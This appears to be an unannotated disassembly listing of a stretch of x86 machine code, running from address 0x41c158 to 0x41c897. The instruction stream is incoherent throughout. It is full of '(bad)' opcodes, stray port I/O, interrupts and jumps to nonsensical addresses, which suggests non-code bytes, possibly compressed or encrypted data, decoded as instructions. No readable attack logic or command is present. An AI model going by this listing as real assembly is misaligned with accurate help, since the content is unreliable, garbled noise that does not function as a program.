  41c158:	adc    edi,DWORD PTR [eax+0x2690bc08]
  41c15e:	push   0x8654af4e
  41c163:	mov    al,ds:0x61191311
  41c168:	ins    DWORD PTR es:[edi],dx
  41c169:	pop    edi
  41c16a:	adc    al,0x6a
  41c16c:	stc    
  41c16d:	mov    dl,0x94
  41c16f:	dec    ebp
  41c170:	fdivr  DWORD PTR [eax-0x24f68e18]
  41c176:	dec    edx
  41c177:	cmc    
  41c178:	sbb    edi,DWORD PTR [esi+0x1b]
  41c17b:	inc    edx
  41c17c:	(bad)  
  41c17d:	out    0x26,eax
  41c17f:	(bad)  
  41c180:	cli    
  41c181:	out    0xe5,eax
  41c183:	add    ah,BYTE PTR [esp+0x37]
  41c187:	loope  0x41c17b
  41c189:	dec    esp
  41c18a:	jae    0x41c188
  41c18c:	retf   0xa581
  41c18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c190:	test   DWORD PTR [ecx+0x24],0x7e5e8bec
  41c197:	jle    0x41c135
  41c199:	nop
  41c19a:	shr    DWORD PTR [esi+0x58],0xa1
  41c19e:	inc    ecx
  41c19f:	sub    bh,bl
  41c1a1:	shl    DWORD PTR [ebp+0x61102f32],0x57
  41c1a8:	and    BYTE PTR [ecx-0x7bc73334],bh
  41c1ae:	les    edi,FWORD PTR [edi-0x6e502943]
  41c1b4:	imul   ebx,DWORD PTR [esi+0x29],0x1d8ad4f5
  41c1bb:	cmp    BYTE PTR [eax+0x60],dl
  41c1be:	cwde   
  41c1bf:	jg     0x41c1fb
  41c1c1:	inc    ecx
  41c1c2:	aas    
  41c1c3:	ds push eax
  41c1c5:	int3   
  41c1c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1c7:	cmp    cl,ch
  41c1c9:	sub    dl,BYTE PTR [edi]
  41c1cb:	daa    
  41c1cc:	add    ecx,DWORD PTR [edx]
  41c1ce:	and    ah,ch
  41c1d0:	add    edx,esp
  41c1d2:	scas   eax,DWORD PTR es:[edi]
  41c1d3:	pop    eax
  41c1d4:	cmc    
  41c1d5:	cwde   
  41c1d6:	xchg   ecx,eax
  41c1d7:	add    eax,0x8ac7be5d
  41c1dc:	fldenv [ecx+ebx*4-0x3]
  41c1e0:	dec    ebx
  41c1e1:	cs jmp 0x8452:0x9f6a5c1e
  41c1e9:	adc    dl,BYTE PTR [ecx]
  41c1eb:	das    
  41c1ec:	mov    eax,0x56b5b4e
  41c1f1:	sti    
  41c1f2:	mov    al,ds:0x3756ad68
  41c1f7:	add    al,0x21
  41c1f9:	jae    0x701f5e76
  41c1ff:	pop    ds
  41c200:	mov    al,ds:0xfc7ae00e
  41c205:	mov    ds:0x4febe03c,eax
  41c20a:	sbb    DWORD PTR [ebx],esi
  41c20c:	xchg   edi,eax
  41c20d:	and    DWORD PTR [ecx],edx
  41c20f:	fwait
  41c210:	ins    BYTE PTR es:[edi],dx
  41c211:	jle    0x41c24b
  41c213:	iret   
  41c214:	xor    eax,0x8eb8c1a3
  41c219:	inc    ebp
  41c21a:	bound  ebx,QWORD PTR gs:[esi+0x69cbfe79]
  41c221:	rep ins BYTE PTR es:[edi],dx
  41c223:	push   es
  41c224:	scas   al,BYTE PTR es:[edi]
  41c225:	aas    
  41c226:	or     BYTE PTR [ebx+0xd],al
  41c229:	and    eax,0xd469e023
  41c22e:	aad    0xdf
  41c230:	push   es
  41c231:	mov    al,ds:0x199af761
  41c236:	mov    bl,0x71
  41c238:	sahf   
  41c239:	(bad)  
  41c23a:	cmc    
  41c23b:	jle    0x41c206
  41c23d:	inc    ebp
  41c23e:	cli    
  41c23f:	sbb    eax,0xa60eb74
  41c244:	cmc    
  41c245:	jge    0x41c1cd
  41c247:	sti    
  41c248:	cmp    al,0xab
  41c24a:	les    edx,FWORD PTR [eax-0x34]
  41c24d:	inc    esi
  41c24e:	pop    edi
  41c24f:	arpl   WORD PTR [esi],cx
  41c251:	fs jge 0x41c230
  41c254:	out    dx,al
  41c255:	jne    0x41c21e
  41c257:	mov    BYTE PTR [esi-0x5d81e23c],bh
  41c25d:	mov    eax,0xfbf3e227
  41c262:	aas    
  41c263:	fcom   st(5)
  41c265:	xor    DWORD PTR [edx],0xffffff99
  41c268:	inc    DWORD PTR [ebx-0x63]
  41c26b:	in     eax,0x9a
  41c26d:	dec    edi
  41c26e:	inc    ebx
  41c26f:	je     0x41c2ca
  41c271:	rol    dh,0xb
  41c274:	mov    al,0x73
  41c276:	sub    DWORD PTR [edx+0x31],edx
  41c279:	xlat   BYTE PTR ds:[ebx]
  41c27a:	push   edx
  41c27b:	adc    bh,BYTE PTR [esi+0x47ebdabf]
  41c281:	in     eax,0x7a
  41c283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c284:	inc    ebx
  41c285:	dec    edi
  41c286:	jns    0x41c29f
  41c288:	call   0x61d506c4
  41c28d:	lods   al,BYTE PTR ds:[esi]
  41c28e:	fisttp QWORD PTR [ecx-0x6f057098]
  41c294:	call   FWORD PTR [edx]
  41c296:	cwde   
  41c297:	mov    BYTE PTR [esp+edx*2+0x6e],al
  41c29b:	lods   eax,DWORD PTR ds:[esi]
  41c29c:	cmp    eax,0x2ca29db8
  41c2a1:	fmul   DWORD PTR [ebx]
  41c2a3:	push   esp
  41c2a4:	pop    ebx
  41c2a5:	je     0x41c2ff
  41c2a7:	int3   
  41c2a8:	adc    ebp,DWORD PTR [edi-0x3e]
  41c2ab:	(bad)  
  41c2ad:	adc    DWORD PTR [esi+0x10f39267],ecx
  41c2b3:	(bad)  
  41c2b4:	loopne 0x41c318
  41c2b6:	mov    esi,0xb475f144
  41c2bb:	sbb    ebp,DWORD PTR [edx+0x47]
  41c2be:	lea    ebp,[eax-0x30]
  41c2c1:	inc    esi
  41c2c2:	popa   
  41c2c3:	mov    ah,BYTE PTR [ebp-0x39]
  41c2c6:	mov    DWORD PTR [edx+edi*4+0x46],esi
  41c2ca:	or     DWORD PTR [esp+edi*4-0x45],edx
  41c2ce:	lods   eax,DWORD PTR ds:[esi]
  41c2cf:	lods   al,BYTE PTR ds:[esi]
  41c2d0:	jmp    0xd8dc9be
  41c2d5:	add    edx,DWORD PTR [edx-0x1d]
  41c2d8:	cmp    al,0x32
  41c2da:	dec    edx
  41c2db:	mov    esi,ds
  41c2dd:	push   es
  41c2de:	mov    dh,0x2
  41c2e0:	push   ebp
  41c2e1:	jae    0x41c33b
  41c2e3:	push   edx
  41c2e4:	test   DWORD PTR [ebx+0x24],0xfc191525
  41c2eb:	mov    ebp,0x1f58828c
  41c2f0:	sbb    edi,0x1a
  41c2f3:	pop    edx
  41c2f4:	xor    DWORD PTR [esi-0x2],eax
  41c2f7:	push   ss
  41c2f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2f9:	jmp    0x41c30d
  41c2fb:	out    dx,eax
  41c2fc:	mov    ecx,0x4ab25992
  41c301:	adc    eax,0x568808d
  41c306:	jle    0x41c334
  41c308:	scas   eax,DWORD PTR es:[edi]
  41c309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c30a:	out    0x5,al
  41c30c:	stos   BYTE PTR es:[edi],al
  41c30d:	mov    cl,0x94
  41c30f:	dec    eax
  41c310:	js     0x41c31a
  41c312:	inc    esi
  41c313:	stos   DWORD PTR es:[edi],eax
  41c314:	dec    edx
  41c315:	mov    ebx,0xa61991d7
  41c31a:	adc    DWORD PTR fs:[edx+0x28],edi
  41c31e:	int    0x35
  41c320:	inc    ebx
  41c321:	gs cmp eax,0xbbd49274
  41c327:	leave  
  41c328:	push   ebp
  41c329:	sbb    cl,dl
  41c32b:	cmp    eax,0xbb9748e6
  41c330:	aas    
  41c331:	mov    ds:0xa7e99598,eax
  41c336:	dec    edx
  41c337:	sbb    esi,eax
  41c339:	daa    
  41c33a:	push   cs
  41c33b:	mov    al,BYTE PTR [ebx+0x424806e4]
  41c341:	mov    eax,ds:0x815157f5
  41c346:	cs xor al,0x55
  41c349:	jle    0x41c30f
  41c34b:	xchg   esi,eax
  41c34c:	xchg   BYTE PTR [edi+0x65],dl
  41c34f:	sub    al,0xbf
  41c351:	mov    al,0x77
  41c353:	adc    ebx,DWORD PTR [esp+edi*1]
  41c356:	int3   
  41c357:	push   eax
  41c358:	lahf   
  41c359:	retf   0xd267
  41c35c:	lods   al,BYTE PTR ds:[esi]
  41c35d:	ins    DWORD PTR es:[edi],dx
  41c35e:	fwait
  41c35f:	cmp    bl,BYTE PTR [edi+eax*4+0x246076e3]
  41c366:	push   edi
  41c367:	push   cs
  41c368:	gs enter 0x7e4f,0xbb
  41c36d:	(bad)  
  41c36e:	push   ecx
  41c36f:	arpl   WORD PTR [eax+0xf458b88],di
  41c375:	vpmadcsswd xmm10,xmm4,xmm2,XMMWORD PTR [esi-0x1a]
  41c37c:	mov    DWORD PTR [ebx+0x49],ecx
  41c37f:	dec    edi
  41c380:	es enter 0x9c0f,0x14
  41c385:	and    DWORD PTR [esi],edx
  41c387:	dec    ebp
  41c388:	loope  0x41c38e
  41c38a:	repnz cmp eax,0x4446f4e9
  41c390:	retf   0x2ef4
  41c393:	stc    
  41c394:	std    
  41c395:	push   edi
  41c396:	or     eax,0xcee3f718
  41c39b:	mov    bh,0x34
  41c39d:	pop    ecx
  41c39e:	pop    edx
  41c39f:	mov    DWORD PTR [edx+0x26],edi
  41c3a2:	repz not BYTE PTR [edx-0x6f]
  41c3a6:	adc    BYTE PTR [esi+0x48],0x98
  41c3aa:	push   ss
  41c3ab:	arpl   WORD PTR [edi-0x336da7a7],cx
  41c3b1:	jge    0x41c3a3
  41c3b3:	fcmovnu st,st(1)
  41c3b5:	add    DWORD PTR ds:0x5fc96015,eax
  41c3bb:	push   ecx
  41c3bc:	dec    esi
  41c3bd:	pop    es
  41c3be:	mov    bh,0x3d
  41c3c0:	push   es
  41c3c1:	arpl   WORD PTR [ecx+eax*2],di
  41c3c4:	dec    ebx
  41c3c5:	add    al,0x6b
  41c3c7:	sbb    eax,0xe9d4539d
  41c3cc:	mov    ecx,0x76328bd5
  41c3d1:	adc    DWORD PTR [edi-0x38553f6b],esp
  41c3d7:	inc    esi
  41c3d8:	ss loop 0x41c3b6
  41c3db:	cdq    
  41c3dc:	mov    esi,0x2817fda5
  41c3e1:	sub    al,0x85
  41c3e3:	cli    
  41c3e4:	jl     0x41c44e
  41c3e6:	imul   ecx,DWORD PTR [eax],0xffffffbc
  41c3e9:	inc    esp
  41c3ea:	into   
  41c3eb:	push   ebp
  41c3ec:	stos   DWORD PTR es:[edi],eax
  41c3ed:	sbb    eax,0xce3c868b
  41c3f2:	retf   0x2a28
  41c3f5:	xchg   bh,bh
  41c3f7:	dec    ebx
  41c3f8:	outs   dx,DWORD PTR ds:[esi]
  41c3f9:	push   0x330212e2
  41c3fe:	stos   BYTE PTR es:[edi],al
  41c3ff:	cld    
  41c400:	repz aaa 
  41c402:	sub    eax,0x18314180
  41c407:	pushf  
  41c408:	(bad)  
  41c409:	js     0x41c3c1
  41c40b:	dec    eax
  41c40c:	cs aam 0x91
  41c40f:	mov    cs,WORD PTR [ecx]
  41c411:	popa   
  41c412:	cmp    esp,edx
  41c414:	rol    esp,1
  41c416:	jmp    0x87ef79da
  41c41b:	and    ebx,DWORD PTR [ecx-0xe]
  41c41e:	fs dec eax
  41c420:	jns    0x41c3f7
  41c422:	repz jg 0x41c3d4
  41c425:	mov    es,WORD PTR [edx+0xc]
  41c428:	jne    0x41c3d2
  41c42a:	and    ebx,DWORD PTR [edi]
  41c42c:	retf   0x7c0a
  41c42f:	and    DWORD PTR [edi],ecx
  41c431:	scas   eax,DWORD PTR es:[edi]
  41c432:	jne    0x41c492
  41c434:	push   0xd526ec06
  41c439:	(bad)  
  41c43a:	jb     0x41c415
  41c43c:	aam    0xa6
  41c43e:	sbb    edi,DWORD PTR [ebx]
  41c440:	inc    eax
  41c441:	sbb    al,bh
  41c443:	mov    ebx,0x8986dad2
  41c448:	lahf   
  41c449:	dec    esi
  41c44a:	add    DWORD PTR [esi+0x36],ebx
  41c44d:	ficom  WORD PTR [esi]
  41c44f:	and    BYTE PTR [edx],bh
  41c451:	pop    esi
  41c452:	push   cs
  41c453:	push   es
  41c454:	xlat   BYTE PTR ds:[ebx]
  41c455:	jns    0x41c404
  41c457:	adc    dl,dh
  41c459:	pop    ecx
  41c45a:	ja     0x41c3f5
  41c45c:	mov    cs,ebx
  41c45e:	add    eax,0xf2cf731d
  41c463:	xor    al,0x3
  41c465:	retf   0xf79b
  41c468:	int3   
  41c469:	out    dx,eax
  41c46a:	sar    bh,0x9b
  41c46d:	mov    eax,0x89d80889
  41c472:	mov    DWORD PTR [ecx],ebp
  41c474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c475:	(bad)  
  41c476:	mov    BYTE PTR [ebp+0x6e3b6c8f],dh
  41c47c:	(bad)
  41c47f:	popf   
  41c480:	inc    edi
  41c481:	inc    DWORD PTR [esi-0x5c]
  41c484:	dec    esi
  41c485:	ss retf 
  41c487:	test   al,0x21
  41c489:	adc    ebp,DWORD PTR [ecx]
  41c48b:	scas   al,BYTE PTR es:[edi]
  41c48c:	ins    DWORD PTR es:[edi],dx
  41c48d:	sub    cl,BYTE PTR [eax]
  41c48f:	jle    0x41c4f6
  41c491:	cmp    al,0x13
  41c493:	dec    ecx
  41c494:	out    0x68,al
  41c496:	xchg   ebx,eax
  41c497:	mov    ebp,0xb6d8a71d
  41c49c:	cmp    BYTE PTR [edi],0xd2
  41c49f:	in     al,0x3
  41c4a1:	sub    BYTE PTR [ecx+eiz*8],bh
  41c4a4:	and    BYTE PTR [edx],ah
  41c4a6:	xchg   BYTE PTR [eax-0x5228299d],dh
  41c4ac:	and    al,0xc1
  41c4ae:	cld    
  41c4af:	dec    esi
  41c4b0:	das    
  41c4b1:	add    edi,DWORD PTR ds:0x355b0f10
  41c4b7:	retf   
  41c4b8:	mov    ds:0xc1511a0,eax
  41c4bd:	and    eax,0x2da61527
  41c4c2:	lods   eax,DWORD PTR ds:[esi]
  41c4c3:	pusha  
  41c4c4:	nop
  41c4c5:	or     eax,0xc3a5e2fa
  41c4ca:	enter  0x9bb7,0x6e
  41c4ce:	stos   DWORD PTR es:[edi],eax
  41c4cf:	add    cl,bl
  41c4d1:	xchg   ebp,eax
  41c4d2:	sub    al,0xee
  41c4d4:	mov    dh,dh
  41c4d6:	fcomp  DWORD PTR [ebp*2-0x293c3722]
  41c4dd:	(bad)  
  41c4df:	push   eax
  41c4e0:	add    edi,esp
  41c4e2:	clc    
  41c4e3:	push   es
  41c4e4:	add    BYTE PTR [esi],bh
  41c4e6:	(bad)  
  41c4e7:	mov    al,ds:0x9c89aabf
  41c4ec:	repnz xor al,0x4a
  41c4ef:	dec    edx
  41c4f0:	mov    ds:0xc6de600e,eax
  41c4f5:	sbb    DWORD PTR [esp+esi*4],ebx
  41c4f8:	lea    ebx,[edx-0x1e]
  41c4fb:	pop    esi
  41c4fc:	out    dx,eax
  41c4fd:	sub    DWORD PTR [esi+0x65],esp
  41c500:	aam    0xdf
  41c502:	mov    cl,bh
  41c504:	imul   ebx,DWORD PTR [ecx+0x36],0xf1f8f8
  41c50b:	xlat   BYTE PTR ds:[ebx]
  41c50c:	lock iret 
  41c50e:	ins    DWORD PTR es:[edi],dx
  41c50f:	push   edi
  41c510:	inc    ebp
  41c511:	and    eax,0x5a6bcb46
  41c516:	dec    eax
  41c517:	mov    dl,0x12
  41c519:	es pop ecx
  41c51b:	outs   dx,DWORD PTR ds:[esi]
  41c51c:	add    al,0xac
  41c51e:	push   ebx
  41c51f:	ja     0x41c535
  41c521:	mov    bl,0xb3
  41c523:	mov    cl,al
  41c525:	in     eax,0xbc
  41c527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c528:	das    
  41c529:	xor    al,0xf1
  41c52b:	dec    ebx
  41c52c:	add    al,0x79
  41c52e:	enter  0x891a,0x2a
  41c532:	arpl   WORD PTR [edi+0x5f],si
  41c535:	int    0x58
  41c537:	mov    dh,0x5e
  41c539:	mov    eax,0xd6785580
  41c53e:	jns    0x41c500
  41c540:	(bad)  [eax]
  41c542:	mov    ch,0x39
  41c544:	mov    ds:0x6de1b6b7,al
  41c549:	rcl    al,cl
  41c54b:	ret    
  41c54c:	ret    0x51ee
  41c54f:	nop
  41c550:	(bad)
  41c554:	mov    BYTE PTR [ecx-0x4],bl
  41c557:	add    eax,0x9fed5cdd
  41c55c:	sbb    dl,BYTE PTR [ecx+0x65]
  41c55f:	out    dx,al
  41c560:	leave  
  41c561:	jecxz  0x41c504
  41c563:	mov    ds:0x8f67a162,eax
  41c568:	icebp  
  41c569:	and    ebx,DWORD PTR [ebx+0x4b8ef7ed]
  41c56f:	jnp    0x41c5ea
  41c571:	pop    ebx
  41c572:	aaa    
  41c573:	in     eax,dx
  41c574:	push   ebx
  41c575:	pop    ds
  41c576:	dec    ebp
  41c577:	fwait
  41c578:	mov    esp,0x35328d4b
  41c57d:	mov    ebx,0xb426f35c
  41c582:	(bad)  
  41c584:	mov    ebx,0xa44c69e
  41c589:	push   esp
  41c58a:	mov    eax,ds:0x99c36a3a
  41c58f:	repnz mov ch,BYTE PTR [ebp-0xd]
  41c593:	xor    BYTE PTR [ebp-0x1c8750a6],dl
  41c599:	sub    ch,BYTE PTR [ebx]
  41c59b:	or     ecx,DWORD PTR [ebp+0x64]
  41c59e:	xchg   BYTE PTR [edx-0x75ad2a42],dh
  41c5a4:	ret    
  41c5a5:	jmp    0x78b452f
  41c5aa:	or     ch,ah
  41c5ac:	xchg   esi,eax
  41c5ad:	das    
  41c5ae:	jo     0x41c54d
  41c5b0:	rcr    ch,0x3f
  41c5b3:	fild   DWORD PTR [ebx+0x22]
  41c5b6:	lods   eax,DWORD PTR ds:[esi]
  41c5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5b8:	je     0x41c60c
  41c5ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5bb:	test   al,0x69
  41c5bd:	add    BYTE PTR [ecx],cl
  41c5bf:	sub    BYTE PTR [edx],bh
  41c5c1:	mov    eax,0xb822c247
  41c5c6:	pusha  
  41c5c7:	inc    ecx
  41c5c8:	dec    eax
  41c5c9:	fistp  DWORD PTR [edx]
  41c5cb:	jmp    0x4f0f4905
  41c5d0:	inc    esi
  41c5d1:	pop    ss
  41c5d2:	icebp  
  41c5d3:	pop    ds
  41c5d4:	xor    eax,0xa14f6e97
  41c5d9:	sub    eax,0x17f3376e
  41c5de:	jge    0x41c641
  41c5e0:	retf   
  41c5e1:	dec    ebx
  41c5e2:	pop    ecx
  41c5e3:	push   0x22834122
  41c5e8:	les    edx,FWORD PTR [ecx]
  41c5ea:	fdiv   QWORD PTR [ecx]
  41c5ec:	pop    eax
  41c5ed:	jmp    0x5c56e2b3
  41c5f2:	cmp    DWORD PTR [edx],0x53461747
  41c5f8:	dec    edx
  41c5f9:	sub    edi,edi
  41c5fb:	mov    edx,0x9adf5bba
  41c600:	scas   eax,DWORD PTR es:[edi]
  41c601:	pop    ecx
  41c602:	pop    esi
  41c603:	fwait
  41c604:	mov    bl,0x67
  41c606:	sbb    al,0xc4
  41c608:	push   ebp
  41c609:	ret    
  41c60a:	pop    ebx
  41c60b:	jb     0x41c66b
  41c60d:	jne    0x41c5a9
  41c60f:	cs add al,0x5
  41c612:	add    DWORD PTR [edx-0x4b],esp
  41c615:	stos   DWORD PTR es:[edi],eax
  41c616:	fs sti 
  41c618:	les    esi,FWORD PTR [eax]
  41c61a:	or     eax,0x8d4beb1b
  41c61f:	dec    edx
  41c620:	imul   esi,DWORD PTR [esi-0x75aeb8d4],0xffffffe3
  41c627:	xor    edx,DWORD PTR [edx+0x46]
  41c62a:	dec    edx
  41c62b:	and    DWORD PTR [edx-0x26],ecx
  41c62e:	nop
  41c62f:	div    ch
  41c631:	fs sti 
  41c633:	or     al,0xc4
  41c635:	mov    bh,0xf
  41c637:	ds mov ch,0xbb
  41c63a:	jl     0x41c5ed
  41c63c:	int3   
  41c63d:	pusha  
  41c63e:	div    al
  41c640:	mov    edi,0x91ad8490
  41c645:	fiadd  DWORD PTR [ecx+0x74]
  41c648:	inc    esp
  41c649:	mov    eax,ds:0xbf14443d
  41c64e:	sub    BYTE PTR [ebx],ch
  41c650:	push   edi
  41c651:	sbb    dh,dh
  41c653:	rcr    DWORD PTR [ebx+edi*4+0x2c58dd27],cl
  41c65a:	or     DWORD PTR [ebx-0x74],eax
  41c65d:	pop    eax
  41c65e:	mov    bl,0xfa
  41c660:	enter  0x1f9f,0xed
  41c664:	loope  0x41c67a
  41c666:	mov    ch,0xb3
  41c668:	scas   al,BYTE PTR es:[edi]
  41c669:	ret    0x179a
  41c66c:	jle    0x41c65d
  41c66e:	pop    ss
  41c66f:	mov    ds:0x54ab1b39,al
  41c674:	stos   BYTE PTR es:[edi],al
  41c675:	push   0x3d
  41c677:	ins    DWORD PTR es:[edi],dx
  41c678:	sub    ah,BYTE PTR [edi-0x31]
  41c67b:	jle    0x41c6d4
  41c67d:	scas   eax,DWORD PTR es:[edi]
  41c67e:	scas   eax,DWORD PTR es:[edi]
  41c67f:	enter  0xcd53,0xfa
  41c683:	adc    BYTE PTR [edi],cl
  41c685:	call   0x832f389b
  41c68a:	ror    BYTE PTR [esi+0x1190113c],1
  41c690:	xor    dh,BYTE PTR [edx+0x232ae066]
  41c696:	sbb    al,BYTE PTR [ebx-0x4dce6728]
  41c69c:	xor    ecx,DWORD PTR [esi-0x5b187f77]
  41c6a2:	lods   eax,DWORD PTR ds:[esi]
  41c6a3:	dec    ebp
  41c6a4:	ror    BYTE PTR [eax-0x6e1d44ff],1
  41c6aa:	jbe    0x41c645
  41c6ac:	ds pop edi
  41c6ae:	xchg   esp,eax
  41c6af:	jbe    0x41c6b1
  41c6b1:	and    esp,DWORD PTR [edi+eax*4+0x7d734ff6]
  41c6b8:	push   bx
  41c6ba:	cmp    al,0x9d
  41c6bd:	dec    esi
  41c6be:	test   al,0x4f
  41c6c0:	daa    
  41c6c1:	out    0xcc,eax
  41c6c3:	aas    
  41c6c4:	push   ss
  41c6c5:	mov    cl,0xe4
  41c6c7:	mul    DWORD PTR [eax]
  41c6c9:	add    dl,0x3f
  41c6cc:	fist   WORD PTR [eax+0x786b6d4c]
  41c6d2:	cs loop 0x41c677
  41c6d5:	cmp    ecx,DWORD PTR [edi-0x7]
  41c6d8:	mov    ebp,0x9375fe57
  41c6dd:	inc    ecx
  41c6de:	adc    ebx,DWORD PTR ds:0xee64dbe
  41c6e4:	pop    ds
  41c6e5:	xor    BYTE PTR [edi],al
  41c6e7:	push   0x34a68ed0
  41c6ec:	pop    edx
  41c6ed:	iret   
  41c6ee:	(bad)  
  41c6ef:	pusha  
  41c6f0:	mov    bl,0x89
  41c6f2:	sub    eax,0xacbcec6d
  41c6f7:	vpcomd xmm11,xmm6,XMMWORD PTR [eax],0x39
  41c6fd:	jb     0x41c682
  41c6ff:	and    al,0x93
  41c701:	or     BYTE PTR [ecx-0x1b],bh
  41c704:	bound  ebx,QWORD PTR [edx+0x78]
  41c707:	jo     0x41c69b
  41c709:	sar    BYTE PTR [ebp+0x61bea3e5],cl
  41c70f:	xor    al,0x88
  41c711:	stos   BYTE PTR es:[edi],al
  41c712:	iret   
  41c713:	leave  
  41c714:	repnz sub eax,0xc0a6f3ef
  41c71a:	push   ebx
  41c71b:	mov    esi,0x7289b8b2
  41c720:	pusha  
  41c721:	stos   BYTE PTR es:[edi],al
  41c722:	mov    al,ds:0xdfce3d0b
  41c727:	xchg   ebp,eax
  41c728:	and    BYTE PTR ds:0xb056645f,dh
  41c72e:	mov    edx,0xcad8a129
  41c733:	lock mov esi,0x75f06b45
  41c739:	mov    esp,0xe7f5d89d
  41c73e:	mov    dh,0x82
  41c740:	lea    ecx,ds:0x3ef3ad0b
  41c746:	pop    eax
  41c747:	mov    ah,0x7c
  41c749:	mul    ah
  41c74b:	call   0x6fe1:0x1bea674e
  41c752:	inc    edi
  41c753:	or     ebx,0x63
  41c756:	inc    edx
  41c757:	cli    
  41c758:	test   edx,esi
  41c75a:	aad    0x5a
  41c75c:	stc    
  41c75d:	cmp    cl,BYTE PTR [ecx]
  41c75f:	and    bl,BYTE PTR [edx-0x42]
  41c762:	loop   0x41c7b1
  41c764:	jmp    0xe14d:0x40fbfb4a
  41c76b:	std    
  41c76c:	std    
  41c76d:	push   0x7f
  41c76f:	jae    0x41c7ef
  41c771:	inc    ebx
  41c772:	iret   
  41c773:	jns    0x41c78c
  41c775:	mov    dh,0xa4
  41c777:	rcl    edi,0xbb
  41c77a:	(bad)  
  41c77b:	(bad)  
  41c77c:	xchg   ebp,eax
  41c77d:	inc    edx
  41c77e:	cs xchg ebx,eax
  41c780:	aam    0x94
  41c782:	outs   dx,DWORD PTR ds:[esi]
  41c783:	cwde   
  41c784:	xor    eax,esi
  41c786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c787:	ds jg  0x41c7c1
  41c78a:	rcr    BYTE PTR [esi],0x53
  41c78d:	jbe    0x41c722
  41c78f:	add    ecx,ebx
  41c791:	and    DWORD PTR [eax+0x6a],ebx
  41c794:	outs   dx,DWORD PTR ds:[esi]
  41c795:	out    0x35,eax
  41c797:	in     al,dx
  41c798:	inc    edi
  41c799:	mov    ebx,0x9505d60
  41c79e:	xchg   edx,eax
  41c7a0:	and    bl,BYTE PTR [ebp-0x25]
  41c7a3:	test   esi,0xd12e66fe
  41c7a9:	arpl   WORD PTR [esi-0x3e12afe6],di
  41c7af:	jno    0x41c7d4
  41c7b1:	lods   eax,DWORD PTR ds:[esi]
  41c7b2:	mov    DWORD PTR [edx+0x7ce0c5c9],edi
  41c7b8:	ja     0x41c7e8
  41c7ba:	push   0xffffff91
  41c7bc:	dec    eax
  41c7bd:	xchg   edi,eax
  41c7be:	adc    dh,0xe7
  41c7c1:	not    DWORD PTR [ebp+0x3f]
  41c7c4:	(bad)  
  41c7c5:	jecxz  0x41c784
  41c7c7:	and    ah,BYTE PTR [esi]
  41c7c9:	xchg   BYTE PTR [ecx+0x7addca87],dh
  41c7cf:	and    DWORD PTR [ebx],esp
  41c7d1:	pushf  
  41c7d2:	lods   eax,DWORD PTR ds:[esi]
  41c7d3:	jl     0x41c7dc
  41c7d5:	in     eax,dx
  41c7d6:	pop    esp
  41c7d7:	scas   al,BYTE PTR es:[edi]
  41c7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7d9:	inc    edx
  41c7da:	hlt    
  41c7db:	adc    BYTE PTR [edi-0x1a],bl
  41c7de:	and    ebp,DWORD PTR [ecx+0x48]
  41c7e1:	rcl    BYTE PTR [ecx],cl
  41c7e3:	int    0xbd
  41c7e5:	xchg   ecx,eax
  41c7e6:	adc    dh,al
  41c7e8:	xor    al,0x0
  41c7ea:	leave  
  41c7eb:	in     al,0x16
  41c7ed:	and    DWORD PTR [ebx+0x461a2f01],ecx
  41c7f3:	inc    ecx
  41c7f4:	ret    0x97a2
  41c7f7:	xchg   edx,eax
  41c7f8:	mov    al,0x32
  41c7fa:	mov    ds:0x8a682daf,eax
  41c7ff:	xchg   esp,eax
  41c800:	retf   
  41c801:	les    edi,FWORD PTR [ecx-0x1636249f]
  41c807:	xor    BYTE PTR [ebp+0x16],0xdf
  41c80b:	sub    esp,DWORD PTR [edx+0x4b]
  41c80e:	xchg   ebx,eax
  41c80f:	xchg   edx,eax
  41c810:	(bad)  
  41c811:	retf   0xac4c
  41c814:	jns    0x41c87a
  41c816:	sahf   
  41c817:	cwde   
  41c818:	pop    ds
  41c819:	push   0x49
  41c81b:	push   cs
  41c81c:	mov    edi,0xce6fc7bf
  41c821:	sbb    eax,0xa3cae8f
  41c826:	fs rol eax,1
  41c829:	fwait
  41c82a:	xchg   esi,eax
  41c82b:	cld    
  41c82c:	or     ah,ch
  41c82e:	ror    DWORD PTR [ebx+ebx*1],0xdf
  41c832:	fiadd  WORD PTR [edi]
  41c834:	inc    ebx
  41c835:	mov    ch,0xed
  41c837:	sti    
  41c838:	in     al,0xa9
  41c83a:	dec    edi
  41c83b:	popf   
  41c83c:	inc    eax
  41c83d:	aam    0xd9
  41c83f:	push   eax
  41c840:	test   eax,0xe9ec7984
  41c845:	ret    0x922f
  41c848:	ins    BYTE PTR es:[edi],dx
  41c849:	xchg   edx,eax
  41c84a:	add    esp,esi
  41c84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c84d:	adc    ah,0xf8
  41c850:	inc    esp
  41c851:	ja     0x41c82a
  41c853:	gs loopne 0x41c8d4
  41c856:	sub    edi,DWORD PTR [edx-0x65]
  41c859:	jns    0x41c85d
  41c85b:	jg     0x41c8a6
  41c85d:	loopne 0x41c8b7
  41c85f:	jp     0x41c87a
  41c861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c862:	and    bh,dh
  41c864:	aam    0x43
  41c866:	push   esi
  41c867:	sar    bh,0x28
  41c86a:	ss inc ebp
  41c86c:	ss jl  0x41c864
  41c86f:	and    BYTE PTR [esi],ch
  41c871:	mov    BYTE PTR [edi-0x26],bl
  41c874:	jg     0x41c84d
  41c876:	fld    DWORD PTR [eax-0x4d8ad755]
  41c87c:	sub    al,bl
  41c87e:	int    0xb4
  41c880:	popf   
  41c881:	push   ebx
  41c882:	dec    eax
  41c883:	adc    BYTE PTR [edx+0x78],cl
  41c886:	sub    al,0x2a
  41c888:	cmp    edx,DWORD PTR [esi-0x2a3e139c]
  41c88e:	pop    es
  41c88f:	pop    eax
  41c890:	les    eax,FWORD PTR [edi+eax*8-0x1b63e6b5]
  41c897:	scas   al,BYTE PTR es:[edi]
